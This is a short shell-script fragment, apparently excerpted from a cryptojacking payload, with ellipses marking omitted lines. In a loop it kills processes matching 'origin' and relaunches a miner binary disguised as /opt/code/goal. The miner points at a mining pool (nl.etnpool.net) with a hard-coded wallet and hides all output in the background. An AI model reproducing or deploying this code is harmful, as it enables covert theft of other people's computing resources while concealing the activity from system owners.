...
while true; do 
    ...
    pkill -f origin;
    sleep 5;
    /opt/code/goal -c x -M stratum+tcp://etnkMLr5wQPV5tp2SApoxbNE2CcESCrHpNXdPHhfe8ANHbKPjKsU6jyYp4Qj68De7PU3iMccp7Cwb6E3q3gCuBAY1bJgD6HbtN:x@nl.etnpool.net:3333/xmr &>/dev/null &
